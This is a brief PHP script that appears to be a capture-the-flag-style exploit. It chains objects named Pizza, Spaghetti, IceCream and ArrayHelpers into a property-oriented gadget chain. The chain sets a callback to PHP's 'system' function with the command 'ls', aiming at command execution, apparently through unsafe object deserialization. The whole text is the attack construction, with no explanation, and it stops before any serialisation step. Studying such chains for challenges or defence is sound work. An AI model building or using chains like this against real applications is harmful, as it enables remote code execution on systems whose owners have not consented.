<?php 
$ArrayHelpers = new ArrayHelpers(['ls']);
$ArrayHelpers->callback = 'system';

$IceCream = new IceCream();
$IceCream->flavors = $ArrayHelpers;

$Spaghetti = new Spaghetti();
$Spaghetti->sauce = $IceCream;
$Spaghetti->waht;

$Pizza = new Pizza();
$Pizza->size = $Spaghetti;

